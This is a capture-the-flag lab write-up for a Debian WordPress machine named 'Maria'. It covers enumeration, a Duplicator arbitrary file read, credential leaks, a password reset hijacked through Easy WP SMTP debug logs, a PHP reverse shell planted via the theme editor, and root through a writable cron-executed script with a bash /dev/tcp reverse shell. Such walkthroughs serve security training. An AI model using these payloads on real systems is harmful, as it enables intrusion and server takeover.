# Maria

## Machine Overview
- **Target IP:** 192.168.173.167
- **OS:** Debian 10
- **Services:** FTP, SSH, HTTP (WordPress), MySQL (MariaDB)
- **Foothold:** WordPress admin via Easy WP SMTP log disclosure
- **Privilege Escalation:** Writable backup script executed by root via cron

---

## Enumeration

### Nmap Scan
```bash
nmap -sCV -Pn -A -T4 192.168.173.167 -oN nmapscan.txt
```

**Key Findings**
- **21/tcp** – FTP (vsftpd 3.0.3)
  - Anonymous login enabled
  - Directory: `automysqlbackup` (read-only)
- **22/tcp** – SSH (OpenSSH 7.9p1)
- **80/tcp** – HTTP (Apache 2.4.38)
  - WordPress 5.7.1
- **3306/tcp** – MySQL (MariaDB 10.3.27)

---

## Web Enumeration (WordPress)

Initial enumeration showed no plugins. Aggressive enumeration was used.

```bash
wpscan --url http://192.168.173.167 --enumerate p --plugins-detection aggressive
```

### Identified Plugins

- **Akismet** – Version unknown
- **Duplicator** – v1.3.26 (Outdated)
  - Directory listing enabled
  - Vulnerable to arbitrary file read (CVE-2020-11738)
- **Easy WP SMTP** – v1.4.1 (Outdated)

---

## Arbitrary File Read (Duplicator)

Using the vulnerable Duplicator plugin, arbitrary files could be read.

- Retrieved `wp-config.php`
- Extracted database credentials:
  - **DB User:** wordpress
  - **DB Password:** wordpress

MySQL login using these credentials failed.

---

## FTP & Backup Enumeration

- FTP root located at `/srv/ftp`
- Found backup scripts related to **automysqlbackup**

Using file read:
```bash
python3 50420.py http://192.168.173.167 /srv/ftp/automysqlbackup/usr/sbin/automysqlbackup
```

Analysis showed credentials referenced from:
```
/etc/default/automysqlbackup
```

### Database Credentials Found
- **User:** backup
- **Password:** EverydayAndEverynight420

---

## MySQL Access

```bash
MYSQL_TCP_PORT=3306 mysql --skip-ssl --protocol=TCP -h 192.168.173.167 -u backup -p
```

Databases:
- `information_schema`
- `wordpress`

### WordPress Users
```sql
SELECT user_login, user_pass FROM wp_users;
```

- Found admin hash
- Password cracking unsuccessful

---

## Easy WP SMTP Log Disclosure

Easy WP SMTP stores email debug logs in:
```
/wp-content/plugins/easy-wp-smtp/
```

- Log filename stored in `wp_options`
- Triggered password reset email via WordPress login page
- Retrieved log filename:
  - `6942dfe3b4871_debug_log.txt`

Browsing the log revealed the **password reset link**.

### Admin Access
- Reset password to: `Joseph@maria2025`
- Logged in as WordPress admin

---

## Initial Foothold (Reverse Shell)

### Method: WordPress Theme Editor

- **Theme:** Twenty Twenty-One
- **File:** `404.php`

```php
<?php
set_time_limit(0);
$ip = '192.168.45.208';
$port = 80;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
```

Listener:
```bash
nc -nvlp 80
```

Trigger:
```
http://192.168.173.167/wp-content/themes/twentytwentyone/404.php
```

Shell stabilized:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

User: `www-data`

---

## Privilege Escalation

### Cron Job Enumeration

Used `pspy` to monitor background processes.

```bash
./pspy64
```

Observed root cron job:
```
/bin/bash /usr/sbin/automysqlbackup
```

---

### Exploiting Writable Backup Script

- Backup scripts executed from:
```
/var/www/html/wordpress/backup_scripts/
```

- Directory writable by `www-data`

Created malicious script executed by root:

```bash
cd /var/www/html/wordpress/backup_scripts
echo 'sh -i >& /dev/tcp/192.168.45.208/80 0>&1' > backup-post
chmod +x backup-post
```

---

## Root Shell

Listener:
```bash
nc -nvlp 80
```

Result:
```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/proof.txt
a4cd49a1e8e5de2d91147ac9e21ba238
```

---

## Summary

- **Initial Access:** Easy WP SMTP log disclosure → WordPress admin
- **Foothold:** PHP reverse shell via theme editor
- **Privilege Escalation:** Writable cron-executed backup script
- **Result:** Root access

